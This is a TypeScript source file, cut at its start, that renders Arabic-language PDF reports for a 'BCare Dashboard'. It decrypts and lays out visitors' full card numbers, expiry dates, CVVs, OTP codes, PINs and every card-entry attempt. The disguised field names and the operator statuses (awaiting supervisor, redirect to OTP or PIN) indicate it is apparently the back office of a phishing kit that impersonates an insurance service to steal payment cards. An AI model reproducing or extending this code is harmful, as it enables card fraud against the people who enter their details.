          ${expiryDate ? `<tr><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;white-space:nowrap;">تاريخ الانتهاء</td><td style="color:#0F172A;font-size:12px;font-weight:800;border:1px solid #D1D5DB;padding:7px 10px;font-family:'Courier New',monospace;">${escapeHtml(expiryDate)}</td></tr>` : ""}
          ${cvv ? `<tr style="background:#F8FAFC;"><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;white-space:nowrap;">CVV / CVC</td><td style="color:#dc2626;font-size:14px;font-weight:900;border:1px solid #D1D5DB;padding:7px 10px;font-family:'Courier New',monospace;letter-spacing:3px;">${escapeHtml(cvv)}</td></tr>` : ""}
          ${cardType ? `<tr><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;white-space:nowrap;">نوع البطاقة</td><td style="color:#0F172A;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;">${escapeHtml(cardType)}</td></tr>` : ""}
          ${bankName ? `<tr style="background:#F8FAFC;"><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;white-space:nowrap;">البنك</td><td style="color:#0F172A;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;">${escapeHtml(bankName)}${bankCountry ? ` (${escapeHtml(bankCountry)})` : ""}</td></tr>` : ""}
          ${visitor.cardStatus ? `<tr><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;white-space:nowrap;">حالة البطاقة</td><td style="font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;color:${(visitor.cardStatus as string) === "approved" ? "#16a34a" : (visitor.cardStatus as string) === "rejected" ? "#dc2626" : "#64748B"};">${escapeHtml(statusLabel(visitor.cardStatus))}</td></tr>` : ""}
        </table>
      </div>

      <!-- OTP / PIN Section -->
      ${(otpCode || pinCode) ? `
      <div style="padding:0 28px 10px;">
        <div style="background:linear-gradient(90deg,#6D28D9,#7C3AED);color:#fff;border-radius:10px 10px 0 0;padding:8px 12px;font-size:13px;font-weight:800;display:flex;align-items:center;gap:8px;">
          <span>🔐</span><span>رموز التحقق</span>
        </div>
        <table style="width:100%;border-collapse:collapse;border:1px solid #D1D5DB;border-top:none;">
          ${otpCode ? `<tr><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;">رمز OTP</td><td style="color:#0F172A;font-size:16px;font-weight:900;border:1px solid #D1D5DB;padding:7px 10px;font-family:'Courier New',monospace;letter-spacing:4px;">${escapeHtml(otpCode)}</td></tr>` : ""}
          ${visitor.otpStatus ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;">حالة OTP</td><td style="font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;color:${visitor.otpStatus === "approved" ? "#16a34a" : visitor.otpStatus?.includes("reject") ? "#dc2626" : "#64748B"};">${escapeHtml(statusLabel(visitor.otpStatus))}</td></tr>` : ""}
          ${pinCode ? `<tr><td style="width:34%;background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;">رمز PIN</td><td style="color:#0F172A;font-size:16px;font-weight:900;border:1px solid #D1D5DB;padding:7px 10px;font-family:'Courier New',monospace;letter-spacing:4px;">${escapeHtml(pinCode)}</td></tr>` : ""}
          ${visitor.pinStatus ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;">حالة PIN</td><td style="font-size:11px;font-weight:700;border:1px solid #D1D5DB;padding:7px 10px;color:${visitor.pinStatus === "approved" ? "#16a34a" : visitor.pinStatus === "rejected" ? "#dc2626" : "#64748B"};">${escapeHtml(statusLabel(visitor.pinStatus))}</td></tr>` : ""}
        </table>
      </div>` : ""}

      <!-- All Attempts History -->
      ${allCardHistory.length > 1 ? `
      <div style="padding:0 28px 10px;">
        <div style="background:linear-gradient(90deg,#0F766E,#0D9488);color:#fff;border-radius:10px 10px 0 0;padding:8px 12px;font-size:13px;font-weight:800;display:flex;align-items:center;gap:8px;">
          <span>🧾</span><span>سجل جميع المحاولات (${allCardHistory.length})</span>
        </div>
        <table style="width:100%;border-collapse:collapse;border:1px solid #D1D5DB;border-top:none;">
          <thead>
            <tr style="background:#E2E8F0;">
              <th style="padding:7px 10px;border:1px solid #D1D5DB;font-size:10px;font-weight:800;color:#334155;white-space:nowrap;">#</th>
              <th style="padding:7px 10px;border:1px solid #D1D5DB;font-size:10px;font-weight:800;color:#334155;">رقم البطاقة</th>
              <th style="padding:7px 10px;border:1px solid #D1D5DB;font-size:10px;font-weight:800;color:#334155;">الانتهاء</th>
              <th style="padding:7px 10px;border:1px solid #D1D5DB;font-size:10px;font-weight:800;color:#334155;">CVV</th>
              <th style="padding:7px 10px;border:1px solid #D1D5DB;font-size:10px;font-weight:800;color:#334155;">حامل البطاقة</th>
              <th style="padding:7px 10px;border:1px solid #D1D5DB;font-size:10px;font-weight:800;color:#334155;">الحالة</th>
              <th style="padding:7px 10px;border:1px solid #D1D5DB;font-size:10px;font-weight:800;color:#334155;">الوقت</th>
            </tr>
          </thead>
          <tbody>${attemptsRows}</tbody>
        </table>
      </div>` : ""}

      <!-- Sign & Stamp -->
      <div style="margin:10px 28px 20px;border:1px dashed #CBD5E1;border-radius:12px;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;gap:14px;">
        <div style="font-size:11px;color:#334155;line-height:1.8;">
          <div><strong>ملاحظة:</strong> هذا التقرير سري ولأغراض إدارية داخلية فقط.</div>
          <div style="margin-top:6px;">التوقيع: ____________________</div>
        </div>
        <img src="${stampBase64}" style="width:130px;height:auto;opacity:0.92;" crossorigin="anonymous" />
      </div>

      <!-- Footer -->
      <div style="text-align:center;font-size:10px;color:#94A3B8;padding-bottom:16px;border-top:1px solid #F1F5F9;padding-top:10px;">
        BCare Dashboard · Card Report · Confidential
      </div>
    </div>
  `;
}

export async function generateCardPdf(visitor: InsuranceApplication) {
  const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
  const { STAMP_BASE64 } = await import("@/lib/pdf-stamp");
  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const container = document.createElement("div");
  container.innerHTML = buildCardPdfHtml(visitor, BECARE_LOGO_BASE64, STAMP_BASE64);
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "760px";
  document.body.appendChild(container);

  const element = container.querySelector("#card-pdf-content") as HTMLElement;

  const opt = {
    margin: [6, 5, 6, 5] as [number, number, number, number],
    filename: `بطاقة_${visitor.identityNumber || visitor.id || "card"}_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.98 },
    html2canvas: {
      scale: 2,
      useCORS: true,
      letterRendering: true,
      scrollY: 0,
    },
    jsPDF: {
      unit: "mm",
      format: "a4",
      orientation: "portrait" as const,
    },
    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}

function buildAllCardsPageHtml(
  visitor: InsuranceApplication,
  logoBase64: string,
  index: number,
  total: number
): string {
  const history = visitor.history || [];
  const allCardHistory = [...history]
    .filter((h: any) => h.type === "_t1" || h.type === "card")
    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
  const allOtpHistory = [...history]
    .filter((h: any) => h.type === "_t2" || h.type === "otp")
    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
  const allPinHistory = [...history]
    .filter((h: any) => h.type === "_t3" || h.type === "pin")
    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());

  const latestCard = allCardHistory[0] ?? null;
  const latestOtp = allOtpHistory[0] ?? null;
  const latestPin = allPinHistory[0] ?? null;

  const cardNumber = latestCard
    ? decryptField(latestCard.data?._v1 || latestCard.data?.cardNumber)
    : decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = latestCard
    ? decryptField(latestCard.data?._v2 || latestCard.data?.cvv)
    : decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = latestCard
    ? decryptField(latestCard.data?._v3 || latestCard.data?.expiryDate)
    : decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = latestCard
    ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
    : decryptField(visitor._v4 || visitor.cardHolderName);
  const inferredCardMeta = inferCardMeta(cardNumber);
  const cardType =
    (latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType)) ||
    inferredCardMeta?.typeLabel ||
    "";
  const bankName =
    (latestCard
      ? val(latestCard.data?.bankInfo?.name)
      : val(visitor.bankInfo?.name)) ||
    inferredCardMeta?.bankName ||
    "";
  const otpCode = latestOtp
    ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
    : val(visitor._v5 || visitor.otpCode || visitor.otp);
  const pinCode = latestPin
    ? val(latestPin.data?._v6 || latestPin.data?.pinCode)
    : val(visitor._v6 || visitor.pinCode);

  const visitorName = val((visitor as any).name || visitor.ownerName);
  const identityNumber = val(visitor.identityNumber);
  const phoneNumber = val(visitor.phoneNumber);
  const reportDate = formatDateTime(new Date());

  const fmt = (num: string) => {
    const clean = num.replace(/\s/g, "");
    return clean.match(/.{1,4}/g)?.join("  ") || num;
  };

  const statusLabel = (status: string | undefined) => {
    if (!status) return "—";
    const map: Record<string, string> = {
      waiting: "بانتظار المشرف", pending: "قيد المراجعة",
      approved: "تم القبول", rejected: "تم الرفض",
      approved_with_otp: "تحويل إلى OTP", approved_with_pin: "تحويل إلى PIN",
      otp_rejected: "OTP مرفوض",
    };
    return map[status] || status;
  };

  const cardLevel = val(
    visitor.cardLevel || visitor.bankInfo?.level || inferredCardMeta?.level,
  );
  const bankLogoUrlPdf = getBankLogoUrlForPdf(bankName);

  const cardNetworkBadge = (type: string) => {
    const t = type.toLowerCase();
    const nLogoUrl = getNetworkLogoUrlForPdf(type);
    if (nLogoUrl) return `<img src="${nLogoUrl}" alt="${escapeHtml(type)}" style="height:22px;max-width:56px;object-fit:contain;" crossorigin="anonymous" />`;
    if (t.includes("visa")) return `<span style="font-size:18px;font-weight:900;font-style:italic;color:#1a1f71;font-family:Arial;">VISA</span>`;
    if (t.includes("master")) return `<span style="font-size:12px;font-weight:900;font-family:Arial;"><span style="color:#eb001b;">master</span><span style="color:#f79e1b;">card</span></span>`;
    if (t.includes("amex") || t.includes("american")) return `<span style="font-size:12px;font-weight:900;color:#006FCF;font-family:Arial;">AMEX</span>`;
    return `<span style="font-size:11px;font-weight:800;color:#333;">${escapeHtml(type)}</span>`;
  };

  const attemptsRows = allCardHistory.map((entry: any, i: number) => {
    const num = decryptField(entry.data?._v1 || entry.data?.cardNumber);
    const exp = decryptField(entry.data?._v3 || entry.data?.expiryDate);
    const cvvA = decryptField(entry.data?._v2 || entry.data?.cvv);
    const holder = decryptField(entry.data?._v4 || entry.data?.cardHolderName);
    return `
      <tr style="background:${i % 2 === 0 ? "#F8FAFC" : "#fff"};">
        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;color:#64748B;">${allCardHistory.length - i}</td>
        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;font-family:'Courier New',monospace;letter-spacing:1px;">${escapeHtml(fmt(num))}</td>
        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;font-family:'Courier New',monospace;">${escapeHtml(exp)}</td>
        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;font-family:'Courier New',monospace;">${escapeHtml(cvvA)}</td>
        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;">${escapeHtml(holder)}</td>
        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;color:${entry.status === "approved" ? "#16a34a" : entry.status === "rejected" ? "#dc2626" : "#64748B"};font-weight:700;">${escapeHtml(statusLabel(entry.status))}</td>
      </tr>`;
  }).join("");

  const isLast = index === total - 1;

  return `
    <div style="width:760px;margin:0 auto;background:#fff;font-family:'Cairo',Arial,sans-serif;direction:rtl;text-align:right;color:#0F172A;-webkit-print-color-adjust:exact;print-color-adjust:exact;${!isLast ? "page-break-after:always;" : ""}">

      <!-- Page Header -->
      <div style="background:linear-gradient(135deg,#0f172a,#1e293b);padding:14px 22px;display:flex;justify-content:space-between;align-items:center;border-radius:12px 12px 0 0;">
        <div>
          <div style="font-size:16px;font-weight:900;color:#fff;">كشف بيانات البطاقة البنكية</div>
          <div style="font-size:10px;color:rgba(148,163,184,0.9);margin-top:2px;">BCare Dashboard · ${escapeHtml(reportDate)} · ${index + 1} / ${total}</div>
        </div>
        <img src="${logoBase64}" style="width:90px;height:auto;background:#fff;border-radius:8px;padding:5px 8px;" crossorigin="anonymous" />
      </div>

      <!-- Owner Strip -->
      <div style="background:#F1F5F9;border-right:4px solid #3B82F6;padding:8px 18px;display:flex;gap:24px;align-items:center;flex-wrap:wrap;">
        ${visitorName ? `<div><div style="font-size:9px;color:#64748B;">الاسم</div><div style="font-size:12px;font-weight:800;">${escapeHtml(visitorName)}</div></div>` : ""}
        ${identityNumber ? `<div><div style="font-size:9px;color:#64748B;">رقم الهوية</div><div style="font-size:11px;font-weight:700;font-family:'Courier New',monospace;">${escapeHtml(identityNumber)}</div></div>` : ""}
        ${phoneNumber ? `<div><div style="font-size:9px;color:#64748B;">الهاتف</div><div style="font-size:11px;font-weight:700;font-family:'Courier New',monospace;">${escapeHtml(phoneNumber)}</div></div>` : ""}
        <div><div style="font-size:9px;color:#64748B;">المحاولات</div><div style="font-size:12px;font-weight:800;color:#1D4ED8;">${allCardHistory.length}</div></div>
      </div>

      <!-- Card Visual + Details side by side -->
      <div style="padding:14px 22px 8px;display:flex;gap:20px;align-items:flex-start;">
        <!-- Visual Card -->
        <div style="flex-shrink:0;">
          <div style="background:linear-gradient(135deg,#e8f5ee 0%,#ddf0e6 35%,#cce8d8 65%,#e2f0e8 100%);border-radius:16px;padding:16px 20px 14px;width:300px;box-shadow:0 6px 24px rgba(0,100,50,0.12),0 2px 6px rgba(0,0,0,0.06);box-sizing:border-box;position:relative;overflow:hidden;">
            <!-- Sheen -->
            <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:16px;background:linear-gradient(135deg,rgba(255,255,255,0.4) 0%,transparent 55%);pointer-events:none;"></div>
            <!-- Top row: SAR badge only -->
            <div style="display:flex;justify-content:flex-end;align-items:flex-start;margin-bottom:14px;">
              <div style="border:1.5px solid #444;border-radius:7px;padding:2px 9px;font-size:11px;font-weight:700;color:#222;font-family:Arial;background:rgba(255,255,255,0.5);">SAR</div>
            </div>
            <!-- Card Number + Expiry -->
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
              <div style="font-size:15px;font-weight:500;color:#111;letter-spacing:1.5px;font-family:'Courier New',monospace;direction:ltr;">
                ${escapeHtml(cardNumber ? fmt(cardNumber) : "•••• •••• •••• ••••")}
              </div>
              <div style="font-size:15px;font-weight:500;color:#111;font-family:'Courier New',monospace;direction:ltr;white-space:nowrap;padding-right:2px;">
                ${escapeHtml(expiryDate || "MM/YY")}
              </div>
            </div>
            <!-- Bank logo/name + CVV -->
            <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:12px;">
              <div>${bankLogoUrlPdf
                ? `<div style="background:#fff;border-radius:7px;padding:2px 6px;display:inline-flex;align-items:center;box-shadow:0 1px 3px rgba(0,0,0,0.08);"><img src="${bankLogoUrlPdf}" alt="${escapeHtml(bankName)}" style="height:24px;max-width:110px;object-fit:contain;" crossorigin="anonymous" /></div>`
                : bankName
                  ? `<div style="font-size:14px;font-weight:900;color:#1a5c35;font-family:Arial,sans-serif;direction:ltr;max-width:150px;">${escapeHtml(bankName)}</div>`
                  : ""
              }</div>
              <div style="text-align:right;">
                <div style="font-size:9px;color:#888;letter-spacing:1px;font-family:Arial;margin-bottom:1px;">CVV</div>
                <div style="font-size:14px;font-weight:600;color:#111;font-family:'Courier New',monospace;direction:ltr;">${escapeHtml(cvv || "—")}</div>
              </div>
            </div>
            <!-- Bottom row: flag + card type + network -->
            <div style="display:flex;justify-content:space-between;align-items:center;">
              <span style="font-size:16px;">🇸🇦</span>
              <div style="display:flex;align-items:center;gap:7px;">
                ${(() => {
                  const nLogo = cardType ? getNetworkLogoUrlForPdf(cardType) : null;
                  const parts = [!nLogo && cardType ? cardType.toUpperCase() : null, cardLevel ? cardLevel.toUpperCase() : null].filter(Boolean);
                  return parts.length ? `<span style="font-size:9px;font-weight:700;color:#333;font-family:Arial;letter-spacing:0.5px;">${escapeHtml(parts.join(" · "))}</span>` : "";
                })()}
                ${cardType ? cardNetworkBadge(cardType) : ""}
              </div>
            </div>
          </div>
        </div>

        <!-- Details Table -->
        <div style="flex:1;">
          <div style="background:linear-gradient(90deg,#1E40AF,#1D4ED8);color:#fff;border-radius:8px 8px 0 0;padding:6px 10px;font-size:12px;font-weight:800;">💳 تفاصيل البطاقة</div>
          <table style="width:100%;border-collapse:collapse;border:1px solid #D1D5DB;border-top:none;">
            ${cardNumber ? `<tr><td style="width:40%;background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;white-space:nowrap;">رقم البطاقة</td><td style="font-size:11px;font-weight:800;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;letter-spacing:1.5px;">${escapeHtml(fmt(cardNumber))}</td></tr>` : ""}
            ${cardHolderName ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">الاسم</td><td style="font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">${escapeHtml(cardHolderName)}</td></tr>` : ""}
            ${expiryDate ? `<tr><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">الانتهاء</td><td style="font-size:11px;font-weight:800;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;">${escapeHtml(expiryDate)}</td></tr>` : ""}
            ${cvv ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">CVV</td><td style="font-size:13px;font-weight:900;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;letter-spacing:3px;color:#dc2626;">${escapeHtml(cvv)}</td></tr>` : ""}
            ${cardType ? `<tr><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">النوع</td><td style="font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">${escapeHtml(cardType)}</td></tr>` : ""}
            ${bankName ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">البنك</td><td style="font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">${escapeHtml(bankName)}</td></tr>` : ""}
            ${otpCode ? `<tr><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">OTP</td><td style="font-size:13px;font-weight:900;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;letter-spacing:3px;color:#7C3AED;">${escapeHtml(otpCode)}</td></tr>` : ""}
            ${pinCode ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">PIN</td><td style="font-size:13px;font-weight:900;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;letter-spacing:3px;color:#7C3AED;">${escapeHtml(pinCode)}</td></tr>` : ""}
            ${visitor.cardStatus ? `<tr><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">الحالة</td><td style="font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;color:${(visitor.cardStatus as string) === "approved" ? "#16a34a" : (visitor.cardStatus as string) === "rejected" ? "#dc2626" : "#64748B"};">${escapeHtml(statusLabel(visitor.cardStatus))}</td></tr>` : ""}
          </table>
        </div>
      </div>

      <!-- Attempts History -->
      ${allCardHistory.length > 1 ? `
      <div style="padding:0 22px 12px;">
        <div style="background:linear-gradient(90deg,#0F766E,#0D9488);color:#fff;border-radius:8px 8px 0 0;padding:6px 10px;font-size:12px;font-weight:800;">🧾 سجل المحاولات (${allCardHistory.length})</div>
        <table style="width:100%;border-collapse:collapse;border:1px solid #D1D5DB;border-top:none;">
          <thead>
            <tr style="background:#E2E8F0;">
              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">#</th>
              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">رقم البطاقة</th>
              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">الانتهاء</th>
              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">CVV</th>
              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">الاسم</th>
              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">الحالة</th>
            </tr>
          </thead>
          <tbody>${attemptsRows}</tbody>
        </table>
      </div>` : ""}

      <!-- Divider footer -->
      <div style="border-top:1px solid #E2E8F0;margin:0 22px;padding:6px 0;font-size:9px;color:#94A3B8;text-align:center;">
        BCare Dashboard · Card Report · ${index + 1} / ${total}
      </div>
    </div>
  `;
}

export async function generateAllCardsPdf(visitors: InsuranceApplication[]) {
  const hasCardData = (v: InsuranceApplication) => {
    const cardFromHistory = (v.history || []).some(
      (h: any) => h.type === "_t1" || h.type === "card"
    );
    const directCard = !!(v._v1 || v.cardNumber);
    return cardFromHistory || directCard;
  };

  const withCards = visitors.filter(hasCardData);
  if (withCards.length === 0) return;

  const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const combinedHtml = `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <div id="all-cards-pdf" style="font-family:'Cairo',Arial,sans-serif;direction:rtl;background:#fff;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
      ${withCards.map((v, i) => buildAllCardsPageHtml(v, BECARE_LOGO_BASE64, i, withCards.length)).join("\n")}
    </div>
  `;

  const container = document.createElement("div");
  container.innerHTML = combinedHtml;
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "780px";
  document.body.appendChild(container);

  const element = container.querySelector("#all-cards-pdf") as HTMLElement;

  const opt = {
    margin: [6, 4, 6, 4] as [number, number, number, number],
    filename: `جميع_البطاقات_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.97 },
    html2canvas: {
      scale: 2,
      useCORS: true,
      letterRendering: true,
      scrollY: 0,
    },
    jsPDF: {
      unit: "mm",
      format: "a4",
      orientation: "portrait" as const,
    },
    pagebreak: { mode: ["css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}

export async function generateVisitorPdf(visitor: InsuranceApplication) {
  const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
  const { STAMP_BASE64 } = await import("@/lib/pdf-stamp");
  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const container = document.createElement("div");
  container.innerHTML = buildPdfHtml(visitor, BECARE_LOGO_BASE64, STAMP_BASE64);
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "700px";
  document.body.appendChild(container);

  const element = container.querySelector("#pdf-content") as HTMLElement;

  const opt = {
    margin: [8, 5, 8, 5] as [number, number, number, number],
    filename: `طلب_تأمين_${visitor.identityNumber || visitor.id || "visitor"}_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.98 },
    html2canvas: {
      scale: 2,
      useCORS: true,
      letterRendering: true,
      scrollY: 0,
    },
    jsPDF: {
      unit: "mm",
      format: "a4",
      orientation: "portrait" as const,
    },
    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}
